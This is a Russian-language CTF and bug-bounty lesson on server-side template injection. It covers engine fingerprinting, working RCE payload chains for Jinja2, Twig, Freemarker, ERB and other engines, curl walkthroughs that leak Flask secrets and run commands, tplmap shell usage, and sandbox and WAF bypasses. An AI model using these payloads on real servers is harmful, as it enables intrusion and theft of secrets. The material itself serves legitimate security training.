---
id: web-ssti
title: "Server-Side Template Injection (SSTI)"
category: web
parent: web-file-upload
difficulty: medium
order: 2
tags: [ssti, jinja2, twig, freemarker, template, rce]
prerequisites: [web-file-upload]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
estimated_minutes: 45
summary: "Как обнаружить SSTI, определить движок шаблонов и дойти от {{7*7}} до выполнения команд."
---

SSTI (Server-Side Template Injection) — это внедрение шаблонного синтаксиса в серверный шаблонизатор. Возникает, когда пользовательский ввод конкатенируется в шаблон и **интерпретируется** движком (Jinja2, Twig, Freemarker, Velocity, ERB, Handlebars, Thymeleaf и др.). Это прямой путь к RCE: большинство движков позволяют добраться до функций/классов и выполнить команду ОС.

## Теория: почему это опасно

Шаблонизаторы исполняют выражения внутри разделителей. Если движок рендерит ваш ввод как код шаблона, вы управляете этим кодом.

Разделители популярных движков:

| Движок | Синтаксис | Язык |
|--------|-----------|------|
| Jinja2 | `{{7*7}}`, `{%...%}` | Python |
| Twig | `{{7*7}}`, `{{_self}}` | PHP |
| Freemarker | `${7*7}`, `<#...>` | Java |
| Velocity | `$x`, `#set()` | Java |
| Smarty | `{$x}`, `{if}` | PHP |
| ERB | `<%= 7*7 %>` | Ruby |
| Handlebars | `{{7*7}}` | Node |
| Thymeleaf | `*{...}`, `${...}` | Java |

Ключевой шаг — **определить движок** по тому, как разные payload вычисляются:

```
{{7*7}}     -> 49  (Jinja2/Twig)
${7*7}      -> 49  (Freemarker/Velocity)
<%= 7*7 %>  -> 49  (ERB)
{{7*'7'}}   -> 7777777 (Jinja2, строка) vs 49 (Twig) -> различаем!
```

Различение Jinja2 vs Twig через `{{7*'7'}}` — классика: Jinja2 даёт `7777777`, Twig даёт `49`.

## Инструменты: ручные payload, tplmap

**Обнаружение** — отправляем арифметику и смотрим на вычисление:

```bash
curl -s "https://target/?name={{7*7}}"
# если в ответе "49" -> SSTI (Jinja2/Twig)
curl -s "https://target/?name=\${7*7}"
# "49" -> Freemarker/Velocity
```

**Автоматизация** — `tplmap`:

```bash
tplmap -u "https://target/?name=test"
tplmap -u "https://target/?name=test" --os-shell
```

**Эксплуатация Jinja2 (Python)** — от выражения к RCE:

```
{{7*7}}                                  -> 49 (подтверждение)
{{config}}                               -> конфиг Flask (утечка SECRET_KEY)
{{''.__class__}}                          -> <class 'str'>
{{''.__class__.__mro__[1].__subclasses__()}}   -> список классов
{{''.__class__.__mro__[1].__subclasses__()[N]}} -> доступ к subprocess.Popen
```

Находим индекс класса `subprocess.Popen` в списке и вызываем:

```
{{''.__class__.__mro__[1].__subclasses__()[<i>]('id',shell=True,stdout=-1).communicate()}}
```

Или через `cycler`/`lipsum`/`request` (глобальные объекты Jinja2):

```
{{lipsum.__globals__['os'].popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

**Эксплуатация Twig (PHP):**

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

(старые версии; для новых — цепочки через `filter`/`map`).

**Эксплуатация Freemarker (Java):**

```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

## Разобранный пример: SSTI в профиле → RCE

Цель — `https://mailmerge.example`, форма, которая подставляет имя в письмо/страницу.

Шаг 1. Тест на вычисление:

```bash
curl -s "https://mailmerge.example/render?name={{7*7}}"
# Hello, 49!   -> SSTI есть
```

Шаг 2. Определяем движок:

```bash
curl -s "https://mailmerge.example/render?name={{7*'7'}}"
# Hello, 7777777!  -> Jinja2 (Python)
```

Шаг 3. Утекаем конфиг Flask (часто там SECRET_KEY → подпись сессий):

```bash
curl -s "https://mailmerge.example/render?name={{config}}"
# <Config {'SECRET_KEY': 'super-secret-key', 'DEBUG': True, ...}>
```

Шаг 4. Ищем класс для RCE:

```bash
curl -s "https://mailmerge.example/render?name={{''.__class__.__mro__[1].__subclasses__()}}" | \
  tr ',' '\n' | grep -n 'Popen\|subprocess' 
# -> 414: <class 'subprocess.Popen'>
```

Шаг 5. Выполняем команду:

```bash
curl -s "https://mailmerge.example/render?name={{''.__class__.__mro__[1].__subclasses__()[414]('id',shell=True,stdout=-1).communicate()}}"
# -> (b'uid=1000(app) ...', None)
```

Шаг 6. Читаем флаг/файлы (или через `lipsum`-цепочку, которая короче):

```bash
curl -s "https://mailmerge.example/render?name={{lipsum.__globals__['os'].popen('cat /flag*').read()}}"
```

## Обход фильтров SSTI

- **`.` запрещена:** используйте `|attr('__class__')` (Jinja2): `{{''|attr('__class__')}}`.
- **`_`/`[` запрещены:** `request.args.x` для передачи, `|attr` вместо `.`, `\x5f\x5fclass\x5f\x5f`.
- **`{{ }}` запрещены:** `{%print(7*7)%}` (Jinja2), `{%...%}` блоки.
- **Ключевые слова фильтруются:** конкатенация строк `'o'+'s'`, `['__glo','bals__']`.
- **WAF:** URL/двойное кодирование, разбиение выражения.

## Типичные ошибки новичков

- **Считать, что `{{7*7}}` = «просто математика».** Это подтверждение исполнения шаблона — уже серьёзно.
- **Не определять движок.** Payload для Jinja2 не сработает в Twig/Freemarker; сначала фингерпринт.
- **Пытаться сразу RCE без проверки глобальных объектов.** Часто `{{config}}`/`{{self}}` уже дают флаг/секрет.
- **Путать SSTI и XSS.** SSTI выполняется на сервере; `{{7*7}}` → `49` в ответе — это SSTI, а не XSS.
- **Не искать контекст.** Иногда ввод попадает не в `{{ }}`, а в `{% %}` или в строку внутри шаблона — payload другой.
- **Игнорировать клиентские шаблонизаторы.** Handlebars/Angular на фронте — это DOM-XSS, не SSTI, но синтаксис похож.
- **Забыть про sandbox.** Jinja2 SandboxedEnvironment блокирует опасные атрибуты — нужны обходы через разрешённые объекты.

## Полный разбор: Jinja2 SSTI → RCE (с выводом)

End-to-end на форме генерации письма.

Шаг 1. Подтверждаем вычисление:

```bash
curl -s "https://app.example/render?name={{7*7}}"
# Hello, 49!   -> SSTI
```

Шаг 2. Определяем движок:

```bash
curl -s "https://app.example/render?name={{7*'7'}}"
# Hello, 7777777!   -> Jinja2 (Python)
curl -s "https://app.example/render?name=\${7*7}"
# Hello, ${7*7}!     -> (не вычислено) не Freemarker/Velocity
```

Шаг 3. Утекаем конфиг (часто `SECRET_KEY` → подпись сессий):

```bash
curl -s "https://app.example/render?name={{config}}"
# <Config {'SECRET_KEY':'s3cr3t','DEBUG':True}>
curl -s "https://app.example/render?name={{self.__init__.__globals__}}"
```

Шаг 4. Быстрый RCE через глобальные объекты Jinja2 (без перебора subclasses):

```bash
curl -s "https://app.example/render?name={{lipsum.__globals__['os'].popen('id').read()}}"
# uid=1000(app) ...
curl -s "https://app.example/render?name={{cycler.__init__.__globals__.os.popen('cat /flag*').read()}}"
```

Шаг 5. Если `lipsum`/`cycler` недоступны — перебираем `subclasses()` и находим `subprocess.Popen`:

```bash
curl -s "https://app.example/render?name={{''.__class__.__mro__[1].__subclasses__()}}" \
  | tr ',' '\n' | grep -n 'Popen\|subprocess\|os._wrap'
# 414: <class 'subprocess.Popen'>
curl -s "https://app.example/render?name={{''.__class__.__mro__[1].__subclasses__()[414]('id',shell=True,stdout=-1).communicate()}}"
# (b'uid=1000(app) ...', None)
```

Шаг 6. Read-back: подтвердите `id`/флаг. Далее — устойчивый канал.

## Reference-таблица: движки и RCE-цепочки

| Движок | Фингерпринт | RCE-цепочка |
|--------|-------------|-------------|
| Jinja2 | `{{7*'7'}}`→`7777777` | `lipsum.__globals__.os.popen`, `cycler`, subclasses→Popen |
| Twig | `{{7*'7'}}`→`49` | `_self.env.registerUndefinedFilterCallback`, `filter('system')` |
| Freemarker | `${7*7}`→49 | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` |
| Velocity | `#set($x=7*7)` | `$class.inspect`/Runtime |
| Smarty | `{7*7}`→49 | `{php}...{/php}`, `{system('id')}` |
| ERB (Ruby) | `<%= 7*7 %>`→49 | `<%= system('id') %>`, backticks |
| Handlebars | `{{7*7}}`→49 | proto-access, `lookup`-цепочки |
| Thymeleaf | `${7*7}`→49 | SpEL через `T(...)` (см. `web-el-ognl-injection`) |

## Обход sandbox и фильтров

- **Запрещён `.`:** `|attr('__class__')` вместо `.__class__`.
- **Запрещены `_`/`[`:** `request.args.x` для передачи, `|attr`, `\x5f\x5fclass\x5f\x5f`.
- **Запрещены `{{ }}`:** `{%print(7*7)%}`.
- **Запрещены ключевые слова:** конкатенация `'o'+'s'`, `['__glo','bals__']`.
- **SandboxedEnvironment:** ищите разрешённые объекты (`cycler`, `lipsum`, `request`), обходы через них.
- **WAF:** двойное URL-кодирование, разбиение выражения, смена регистра.
- **Фильтр по `os`/`popen`:** используйте `subprocess`/`__import__`/`builtins`.

## Что делать дальше / решение

1. **Подтвердить SSTI** (`{{7*7}}`/`${7*7}`).
2. **Определить движок** (`{{7*'7'}}`, ошибки).
3. **Проверить лёгкие цели:** `{{config}}`, `{{self}}`, `{{lipsum.__globals__}}`.
4. **RCE:** глобальные объекты → subclasses → Popen/Execute.
5. **Обойти sandbox/фильтры** (attr, concat, кодирование).
6. **Read-back** (`id`/флаг) и закрепление.
7. **Оформить PoC** с точным payload и движком.

## Twig/Freemarker/другие движки: полные цепочки

**Twig (PHP):**

```twig
{{7*7}}                        {# 49 #}
{{7*'7'}}                      {# 49 (в отличие от Jinja2) #}
{{_self}}                      {# утечка имени шаблона #}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
{{['id']|map('system')|join}}
{{['id']|filter('system')}}
```

Для новых версий Twig (после патчей) ищите `filter`/`map`/`sort` с callback и `include`/`source` функции.

**Freemarker (Java):**

```freemarker
${7*7}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}
```

Обход запрета `?new`: через `?api`/`?eval` или `freemarker.template.utility.ObjectConstructor`.

**Velocity (Java):**

```velocity
#set($x=7*7)$x
#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
```

**Smarty (PHP):**

```smarty
{7*7}
{php}system('id');{/php}     {# если php-теги разрешены #}
{system('id')}
{Smarty_Internal_Write_File::writeFile(...)}
```

**ERB (Ruby):**

```erb
<%= 7*7 %>
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').read %>
```

**Handlebars (Node):**

```handlebars
{{7*7}}
{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{/with}}{{/with}}{{/with}}
```

Handlebars-цепочки сложны и зависят от версии; ищите публичные PoC под конкретную версию.

**Thymeleaf (Java):** использует SpEL/OGNL — см. `web-el-ognl-injection` (`${T(...)}`).

## Sandbox и обходы: детали

- **Jinja2 SandboxedEnvironment:** блокирует `__`-атрибуты; обходы через `|attr`, `request`, `cycler`, `lipsum`, `joiner`.
- **Twig sandbox:** запрещает опасные функции; обходы через разрешённые callback (`map`/`filter`/`sort`).
- **Freemarker `?new` disabled:** через `ObjectConstructor`/`?api`.
- **WAF:** двойное кодирование, разрыв тегов, смена регистра, комментарии.

Всегда сначала определяйте движок и версию, затем берите подходящую цепочку — универсального payload нет.

## Инструменты tplmap и методика

**tplmap** автоматизирует обнаружение и эксплуатацию SSTI:

```bash
tplmap -u "https://target/?name=test"
# [*] Testing if GET parameter 'name' is injectable
# [+] Jinja2 plugin has confirmed injection
# [+] RCE: system('id')

tplmap -u "https://target/?name=test" --os-cmd "id"
tplmap -u "https://target/?name=test" --os-shell
tplmap -u "https://target/?name=test" --level 5
```

**Методика ручного теста:**

1. Отправьте `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `{7*7}`, `#set($x=7*7)$x` — что вычислилось?
2. Различите движок: `{{7*'7'}}` (Jinja2→`7777777`, Twig→`49`), `${7*7}` (Freemarker/Velocity), `<%= 7*7 %>` (ERB).
3. Проверьте лёгкие утечки: `{{config}}`, `{{self}}`, `{{_self}}`, `{{lipsum}}`.
4. RCE через цепочку под движок (см. reference-таблицу).
5. Обойдите sandbox/фильтры (`|attr`, конкатенация, кодирование).
6. Read-back (`id`/флаг), затем закрепление.

**Контекст важен:** ввод может попадать не в `{{ }}`, а в строку внутри шаблона или в `{% %}` — тогда payload другой (например, разрыв строки/блока). Проверяйте, как именно ввод встроен в шаблон.

## Итог по SSTI

SSTI — прямой путь к RCE. Алгоритм: подтвердить вычисление → определить движок → проверить лёгкие утечки (`config`/`self`) → RCE через цепочку под движок → обойти sandbox. Универсального payload нет: Jinja2, Twig, Freemarker, ERB и другие требуют своих цепочек. Всегда сначала фингерпринт движка.

## Быстрый чек-лист SSTI

1. `{{7*7}}`/`${7*7}`/`<%=7*7%>` — вычисляется? 2. Движок (`{{7*'7'}}`). 3. `{{config}}`/`{{self}}`. 4. RCE-цепочка под движок. 5. Обход sandbox (`|attr`, concat). 6. Read-back `id`.

## Замечание по контексту

Если ввод попадает внутрь строки шаблона, сначала «выйдите» из неё (`'}}`), затем инжектируйте выражение. Если ввод в `{% %}`-блоке — синтаксис другой. Всегда проверяйте, как именно значение встроено, прежде чем слать сложные цепочки.

## Квиз

Выберите один вариант в каждом вопросе.

```quiz
- question: "Какой payload подтверждает SSTI, если ответ содержит `49`?"
  options:
    - "`<script>alert(1)</script>`"
    - "`{{7*7}}`"
    - "`' OR 1=1-- -`"
    - "`../../etc/passwd`"
  answer: 1
  explanation: "Арифметика вычисляется шаблонизатором."
- question: "Как различить Jinja2 и Twig?"
  options:
    - "По цвету страницы"
    - "`{{7*'7'}}` даёт `7777777` (Jinja2) или `49` (Twig)"
    - "Никак"
    - "По User-Agent"
  answer: 1
  explanation: "Разное поведение при умножении строки на число."
- question: "Что даёт `{{config}}` в Flask/Jinja2?"
  options:
    - "Ничего"
    - "Конфигурацию приложения (часто с SECRET_KEY)"
    - "Список файлов"
    - "Ошибку"
  answer: 1
  explanation: "Утечка секретов конфигурации."
- question: "Как обойти запрет символа `.` в Jinja2?"
  options:
    - "Использовать `|attr('__class__')`"
    - "Использовать `,`"
    - "Никак"
    - "Использовать `+`"
  answer: 0
  explanation: "Фильтр `attr` обращается к атрибутам по строке."
- question: "Какой движок использует `${7*7}`?"
  options:
    - "Jinja2"
    - "Freemarker/Velocity"
    - "ERB"
    - "Handlebars"
  answer: 1
  explanation: "`${...}` — синтаксис Java-движков."
```

## Где пригодится

- **CTF (Web):** SSTI — любимый класс задач на RCE; часто достаточно `{{config}}` или цепочки `lipsum`/`cycler`.
- **Bug bounty:** SSTI критичен (RCE), встречается в генераторах писем/PDF/отчётов, где имя пользователя попадает в шаблон.
- **Пентест:** обязательный тест полей, попадающих в генерацию документов/уведомлений.
- **Работа (AppSec):** «не конкатенируй ввод в шаблон», sandboxing, обновление движков — меры против SSTI.
